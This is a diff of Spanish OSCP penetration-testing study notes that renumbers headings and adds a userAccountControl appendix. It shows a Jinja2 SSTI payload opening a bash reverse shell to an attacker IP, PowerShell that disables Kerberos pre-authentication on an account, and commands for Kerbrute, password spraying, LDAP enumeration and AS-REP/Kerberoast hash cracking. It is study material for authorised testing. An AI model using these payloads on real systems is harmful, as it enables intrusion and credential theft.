@@ -98,6 +98,7 @@ Apuntes para la certificación OSCP.
     * 5.7. [Server-Side Request Forgery (SSRF)](#server-side-request-forgery-(ssrf))
     * 5.8. [Server-Side Template Injection (SSTI)](#server-side-template-injection-(ssti))
         * 5.8.1. [Magic Payload](#magic-payload)
+        * 5.8.2. [Jinja 2 - Reverse Shell](#jinja-2---reverse-shell)
 * 6. [Pivoting](#pivoting)
     * 6.1. [Chisel](#chisel)
         * 6.1.1. [Servidor (Atacante)](#servidor-(atacante))
@@ -178,34 +179,39 @@ Apuntes para la certificación OSCP.
         * 11.1.6. [Computadoras](#computadoras)
         * 11.1.7. [Unidades Organizativas](#unidades-organizativas)
         * 11.1.8. [GPO (Group Policy Object)](#gpo-(group-policy-object))
-    * 11.2. [Enumeración](#enumeración-3)
-        * 11.2.1. [Kerbrute](#kerbrute)
-        * 11.2.2. [Password Spraying](#password-spraying)
-        * 11.2.3. [BloodHound](#bloodhound)
-        * 11.2.4. [ldapsearch](#ldapsearch)
-        * 11.2.5. [ldapdomaindump](#ldapdomaindump)
-        * 11.2.6. [NetExec - LDAP](#netexec---ldap)
-    * 11.3. [Grupos Privilegiados](#grupos-privilegiados)
-        * 11.3.1. [Account Operators](#account-operators)
-        * 11.3.2. [Server Operators](#server-operators)
-        * 11.3.3. [DnsAdmins](#dnsadmins)
-        * 11.3.4. [Backup Operators](#backup-operators)
-    * 11.4. [Kerberos](#kerberos)
-        * 11.4.1. [¿Qué es Kerberos?](#¿qué-es-kerberos?)
-        * 11.4.2. [AS-REPRoasting](#as-reproasting)
-        * 11.4.3. [Kerberoasting](#kerberoasting)
-    * 11.5. [Enumeración](#enumeración-4)
-    * 11.6. [Movimiento Lateral](#movimiento-lateral-1)
-    * 11.7. [Post Explotación](#post-explotación)
-* 12. [Herramientas y Recursos](#herramientas-y-recursos)
-    * 12.1. [Pivoting](#pivoting-1)
-    * 12.2. [Information Gathering](#information-gathering-1)
-    * 12.3. [Web](#web-1)
-    * 12.4. [Bases de datos](#bases-de-datos)
-    * 12.5. [Passwords Attacks](#passwords-attacks-1)
-    * 12.6. [Wordlists](#wordlists)
-    * 12.7. [Escalación de Privilegios](#escalación-de-privilegios-3)
-    * 12.8. [Recursos y Blogs](#recursos-y-blogs)
+    * 11.2. [Habilitar DONT-REQ-PRE-AUTH](#habilitar-dont-req-pre-auth)
+    * 11.3. [Deshabilitar DONT-REQ-PRE-AUTH](#deshabilitar-dont-req-pre-auth)
+    * 11.4. [Enumeración](#enumeración-3)
+        * 11.4.1. [Kerbrute](#kerbrute)
+        * 11.4.2. [Password Spraying](#password-spraying)
+        * 11.4.3. [BloodHound](#bloodhound)
+        * 11.4.4. [ldapsearch](#ldapsearch)
+        * 11.4.5. [ldapdomaindump](#ldapdomaindump)
+        * 11.4.6. [NetExec - LDAP](#netexec---ldap)
+    * 11.5. [Grupos Privilegiados](#grupos-privilegiados)
+        * 11.5.1. [Account Operators](#account-operators)
+        * 11.5.2. [Server Operators](#server-operators)
+        * 11.5.3. [DnsAdmins](#dnsadmins)
+        * 11.5.4. [Backup Operators](#backup-operators)
+    * 11.6. [Kerberos](#kerberos)
+        * 11.6.1. [¿Qué es Kerberos?](#¿qué-es-kerberos?)
+        * 11.6.2. [AS-REPRoasting](#as-reproasting)
+        * 11.6.3. [Kerberoasting](#kerberoasting)
+    * 11.7. [Enumeración](#enumeración-4)
+    * 11.8. [Movimiento Lateral](#movimiento-lateral-1)
+    * 11.9. [Post Explotación](#post-explotación)
+* 12. [Apéndice](#apéndice)
+    * 12.1. [🎯 Flags de userAccountControl (AD)](#🎯-flags-de-useraccountcontrol-(ad))
+* 13. [Herramientas y Recursos](#herramientas-y-recursos)
+    * 13.1. [Pivoting](#pivoting-1)
+    * 13.2. [Information Gathering](#information-gathering-1)
+    * 13.3. [Web](#web-1)
+    * 13.4. [Bases de datos](#bases-de-datos)
+    * 13.5. [Passwords Attacks](#passwords-attacks-1)
+    * 13.6. [Wordlists](#wordlists)
+    * 13.7. [Active Directory](#active-directory-1)
+    * 13.8. [Escalación de Privilegios](#escalación-de-privilegios-3)
+    * 13.9. [Recursos y Blogs](#recursos-y-blogs)
 
 <!-- vscode-markdown-toc-config
 	numbering=true
@@ -1454,7 +1460,7 @@ http://<RHOST>/index.php?view=<RHOST>://shell.php
 {{ ''.__class__.__mro__[1].__subclasses__() }}
 ```
 
-#### Jinja 2 - Reverse Shell
+####  5.8.2. <a name='jinja-2---reverse-shell'></a>Jinja 2 - Reverse Shell
 
 ```python
 {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("bash -c 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1'").read()}}{%endif%}{%endfor%}
@@ -4876,7 +4882,7 @@ Para restaurar desde una copia de seguridad:
 Restore-GPO -Name "NombreGPO" -Path "C:\Ruta\Backup"
 ```
 
-### Habilitar DONT-REQ-PRE-AUTH
+###  11.2. <a name='habilitar-dont-req-pre-auth'></a>Habilitar DONT-REQ-PRE-AUTH
 
 ```powershell
 # Nombre del usuario a modificar
@@ -4898,18 +4904,18 @@ Set-ADUser -Identity $user -Replace @{userAccountControl=$newUAC}
 (Get-ADUser -Identity $user -Properties userAccountControl).userAccountControl
 ```
 
-### Deshabilitar DONT-REQ-PRE-AUTH
+###  11.3. <a name='deshabilitar-dont-req-pre-auth'></a>Deshabilitar DONT-REQ-PRE-AUTH
 
 ```powershell
 $newUAC = $u.userAccountControl -band -bnot 0x400000
 Set-ADUser -Identity $user -Replace @{userAccountControl=$newUAC}
 ```
 
-###  11.2. <a name='enumeración-3'></a>Enumeración
+###  11.4. <a name='enumeración-3'></a>Enumeración
 
 Si no tenemos un usuario con el que empezar las pruebas (que suele ser el caso), tendremos que encontrar una manera de establecer un punto de apoyo en el dominio, ya sea obteniendo credenciales en texto claro o un hash de contraseña NTLM para un usuario, un shell SYSTEM en un host unido al dominio, o un shell en el contexto de una cuenta de usuario de dominio. Obtener un usuario válido con credenciales es crítico en las primeras etapas de una prueba de penetración interna. Este acceso (incluso al nivel más bajo) abre muchas oportunidades para realizar enumeraciones e incluso ataques.
 
-####  11.2.1. <a name='kerbrute'></a>Kerbrute
+####  11.4.1. <a name='kerbrute'></a>Kerbrute
 
 [Kerbrute](https://github.com/ropnop/kerbrute) puede ser una opción más sigilosa para la enumeración de cuentas de dominio. Se aprovecha del hecho de que los fallos de pre-autenticación Kerberos a menudo no activan registros o alertas. Utilizaremos Kerbrute junto con las listas de usuarios como pueden ser **jsmith.txt** o **jsmith2.txt** de [Insidetrust](https://github.com/insidetrust/statistically-likely-usernames). Este repositorio contiene muchas listas de usuarios diferentes que pueden ser extremadamente útiles cuando se intenta enumerar usuarios cuando se comienza desde una perspectiva no autenticada. Podemos apuntar Kerbrute al DC y alimentarlo con una lista de palabras. La herramienta es rápida, y se nos proporcionarán resultados que nos permitirán saber si las cuentas encontradas son válidas o no, lo cual es un gran punto de partida para lanzar ataques como el de Password Spraying.
 
@@ -4928,7 +4934,7 @@ kerbrute bruteuser --d HACKLAB.LOCAL -dc 192.168.56.10 jsmith.txt thomas.brown
 Otras herramientas a tener en cuenta son [RPCClient](#426-rpcclient) y [Enum4Linux](#424-enum4linux).
 
 
-####  11.2.2. <a name='password-spraying'></a>Password Spraying
+####  11.4.2. <a name='password-spraying'></a>Password Spraying
 
 Otro aspecto destacable es el ataque conocido como Password Spraying. Para contextualizar, imaginemos que disponemos de unas credenciales como `thomas.brown:MySup3erPass123!`. Una táctica común en este escenario es conectarse al Protocolo de Llamada a Procedimientos Remotos (RPC) - para extraer una lista de todos los usuarios del dominio. Esta lista se guarda en un archivo, por ejemplo users.txt, y luego se proporciona como entrada a herramientas como el propio netexec, junto con la contraseña antes mencionada. Este proceso permite intentar el acceso a múltiples cuentas del dominio, aprovechando la débil seguridad de la contraseña utilizada.
 
@@ -4944,7 +4950,7 @@ nxc smb 192.168.56.10 -u users.txt -p passwords.txt --continue-on-success --no-b
 
 El argumento `--no-bruteforce` se emplea para evitar la prueba de todas las contraseñas disponibles para cada usuario, en su lugar, se prueba el usuario de la línea 1 con la contraseña de la línea 1, el usuario de la línea 2 con la contraseña de la línea 2, y así sucesivamente.
 
-####  11.2.3. <a name='bloodhound'></a>BloodHound
+####  11.4.3. <a name='bloodhound'></a>BloodHound
 
 ##### Opción 1
 
@@ -4987,7 +4993,7 @@ Otra alternativa es utilizar [SharpHound.exe](https://github.com/SpecterOps/Bloo
 
 Por ultimo, descargamos el archivo `zip` nuevamente y los subimos en `BloodHound`.
 
-####  11.2.4. <a name='ldapsearch'></a>ldapsearch
+####  11.4.4. <a name='ldapsearch'></a>ldapsearch
 Para enumerar a través del protoclo LDAP, podemos usar la herramienta `ldapsearch`:
 
 ```bash
@@ -5009,7 +5015,7 @@ ldapsearch -H ldap://192.168.56.10 -D 'thomas.brown@HACKLAB.local' -w 'MySup3erP
 ldapsearch -H ldap://192.168.56.10 -D 'thomas.brown@HACKLAB.local' -w 'MySup3erPass123!' -x -s base -b "DC=HACKLAB,DC=LOCAL" "(objectClass=*)" "*" +
 ```
 
-####  11.2.5. <a name='ldapdomaindump'></a>ldapdomaindump
+####  11.4.5. <a name='ldapdomaindump'></a>ldapdomaindump
 
 En caso de tener credenciales válidas podemos hacer uso de `ldapdomaindump`:
 
@@ -5019,7 +5025,7 @@ ldapdomaindump -u 'HACKLAB.local\thomas.brown' -p 'Password123' 192.168.56.10
 
 Esto generará unos archivos `json`, `grep`, `html` que con un servidor web podemos ver en el navegador.
 
-####  11.2.6. <a name='netexec---ldap'></a>NetExec - LDAP
+####  11.4.6. <a name='netexec---ldap'></a>NetExec - LDAP
 
 ```bash
 netexec ldap <RHOST> -u '' -p '' -M -user-desc
@@ -5044,18 +5050,18 @@ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --bloodhound -ns <RHOST> -c
 netexec ldap <RHOST> -u '<USERNAME>' --use-kcache --bloodhound --dns-tcp --dns-server <RHOST> -c All
 ```
 
-###  11.3. <a name='grupos-privilegiados'></a>Grupos Privilegiados
+###  11.5. <a name='grupos-privilegiados'></a>Grupos Privilegiados
 
-####  11.3.1. <a name='account-operators'></a>Account Operators
-####  11.3.2. <a name='server-operators'></a>Server Operators
-####  11.3.3. <a name='dnsadmins'></a>DnsAdmins
-####  11.3.4. <a name='backup-operators'></a>Backup Operators
+####  11.5.1. <a name='account-operators'></a>Account Operators
+####  11.5.2. <a name='server-operators'></a>Server Operators
+####  11.5.3. <a name='dnsadmins'></a>DnsAdmins
+####  11.5.4. <a name='backup-operators'></a>Backup Operators
 
-###  11.4. <a name='kerberos'></a>Kerberos
+###  11.6. <a name='kerberos'></a>Kerberos
 
 ![Kerberos](./img/kerberos.webp)
 
-####  11.4.1. <a name='¿qué-es-kerberos?'></a>¿Qué es Kerberos?
+####  11.6.1. <a name='¿qué-es-kerberos?'></a>¿Qué es Kerberos?
 
 Kerberos es un protocolo de **autenticación**, pero no de autorización. Esto significa que su función es verificar la identidad de un usuario mediante una contraseña conocida solo por él, sin definir a qué recursos o servicios puede acceder.  
 
@@ -5123,7 +5129,7 @@ A continuación se muestra un resumen de los mensajes siguiendo la secuencia de 
 
 ![Kerberos Flow](./img/kerberos_flow.png)
 
-####  11.4.2. <a name='as-reproasting'></a>AS-REPRoasting
+####  11.6.2. <a name='as-reproasting'></a>AS-REPRoasting
 
 **AS-REPRoasting** es uno de los ataques más básicos contra Kerberos y tiene como objetivo cuentas sin **preautenticación habilitada**. Aunque es poco común en entornos bien configurados, es uno de los pocos ataques de Kerberos que **no requiere autenticación previa**.  
 
@@ -5178,7 +5184,7 @@ john --wordlist=rockyou.txt hashes.asreproast
 
 - Revisión de políticas de seguridad.
 
-####  11.4.3. <a name='kerberoasting'></a>Kerberoasting  
+####  11.6.3. <a name='kerberoasting'></a>Kerberoasting  
 
 > Un **Service Principal Name (SPN)** es un identificador único de una instancia de servicio. Los SPN son utilizados por la autenticación Kerberos para asociar una instancia de servicio con una cuenta de inicio de sesión de servicio.  
 > — [MSDN](https://docs.microsoft.com/windows/desktop/AD/service-principal-names)  
@@ -5242,20 +5248,20 @@ john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt hashes.kerbero
 
 - No ejecutar las cuentas de Servicio como Administrador del Dominio.
 
-###  11.5. <a name='enumeración-4'></a>Enumeración
+###  11.7. <a name='enumeración-4'></a>Enumeración
 
 ```powershell
 [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
 
 ```
 
-###  11.6. <a name='movimiento-lateral-1'></a>Movimiento Lateral
+###  11.8. <a name='movimiento-lateral-1'></a>Movimiento Lateral
 
-###  11.7. <a name='post-explotación'></a>Post Explotación
+###  11.9. <a name='post-explotación'></a>Post Explotación
 
-## Apéndice
+##  12. <a name='apéndice'></a>Apéndice
 
-### 🎯 Flags de userAccountControl (AD)
+###  12.1. <a name='🎯-flags-de-useraccountcontrol-(ad)'></a>🎯 Flags de userAccountControl (AD)
 
 | Flag Name                        | Valor (Decimal) | Valor (Hexadecimal) | Descripción                                                                 |
 |----------------------------------|------------------|----------------------|-----------------------------------------------------------------------------|
@@ -5285,23 +5291,23 @@ john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt hashes.kerbero
 > 💡 Podemos combinar múltiples flags con OR binario (`-bor`) y removerlas con AND + NOT (`-band -bnot`).
 
 
-##  12. <a name='herramientas-y-recursos'></a>Herramientas y Recursos
+##  13. <a name='herramientas-y-recursos'></a>Herramientas y Recursos
 
 Enlaces a las distintas herramientas y recursos.
-###  12.1. <a name='pivoting-1'></a>Pivoting
+###  13.1. <a name='pivoting-1'></a>Pivoting
 
 | Nombre    | URL                                                                      |
 | --------- | ------------------------------------------------------------------------ |
 | Chisel    | [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) |
 | Ligolo-ng | https://github.com/nicocha30/ligolo-ng |
                             
-###  12.2. <a name='information-gathering-1'></a>Information Gathering
+###  13.2. <a name='information-gathering-1'></a>Information Gathering
 
 | Nombre | URL                          |
 | ------ | ---------------------------- |
 | Nmap   | https://github.com/nmap/nmap |
 
-###  12.3. <a name='web-1'></a>Web
+###  13.3. <a name='web-1'></a>Web
 
 | Nombre                     | URL                                                                          |
 | -------------------------- | ---------------------------------------------------------------------------- |
@@ -5319,13 +5325,13 @@ Enlaces a las distintas herramientas y recursos.
 | Git-Dumper                 | https://github.com/arthaud/git-dumper                                        |
 | Extractor                  | https://github.com/internetwache/GitTools/blob/master/Extractor/extractor.sh |
 
-###  12.4. <a name='bases-de-datos'></a>Bases de datos
+###  13.4. <a name='bases-de-datos'></a>Bases de datos
 
 | Nombre                   | URL                            |
 | ------------------------ | ------------------------------ |
 | SQL Injection Cheatsheet | https://tib3rius.com/sqli.html |
 
-###  12.5. <a name='passwords-attacks-1'></a>Passwords Attacks
+###  13.5. <a name='passwords-attacks-1'></a>Passwords Attacks
 
 | Nombre                          | URL                                                                                                        |
 | ------------------------------- | ---------------------------------------------------------------------------------------------------------- |
@@ -5343,7 +5349,7 @@ Enlaces a las distintas herramientas y recursos.
 | ntlm.pw                         | [https://ntlm.pw](https://ntlm.pw)                                                                         |
 | pypykatz                        | [https://github.com/skelsec/pypykatz](https://github.com/skelsec/pypykatz)                                 |
 
-###  12.6. <a name='wordlists'></a>Wordlists
+###  13.6. <a name='wordlists'></a>Wordlists
 
 | Nombre                        | URL                                                                                                                |
 | ----------------------------- | ------------------------------------------------------------------------------------------------------------------ |
@@ -5356,13 +5362,13 @@ Enlaces a las distintas herramientas y recursos.
 | CeWL                          | [https://github.com/digininja/cewl](https://github.com/digininja/cewl)                                             |
 | API Wordlist                  | https://github.com/chrislockard/api_wordlist/blob/master/api_seen_in_wild.txt                                      |
 
-### Active Directory
+###  13.7. <a name='active-directory-1'></a>Active Directory
 
 | Nombre   | URL                                                      |
 | -------- | -------------------------------------------------------- |
 | Powermad | https://github.com/Kevin-Robertson/Powermad              |
 
-###  12.7. <a name='escalación-de-privilegios-3'></a>Escalación de Privilegios
+###  13.8. <a name='escalación-de-privilegios-3'></a>Escalación de Privilegios
 
 | Nombre   | URL                                                      |
 | -------- | -------------------------------------------------------- |
@@ -5371,7 +5377,7 @@ Enlaces a las distintas herramientas y recursos.
 | Linpeas  | https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS |
 | SigmaPotato | https://github.com/tylerdotrar/SigmaPotato |
 
-###  12.8. <a name='recursos-y-blogs'></a>Recursos y Blogs
+###  13.9. <a name='recursos-y-blogs'></a>Recursos y Blogs
 
 | Nombre                                                  | URL                                                                                                                                                                          |
 | ------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
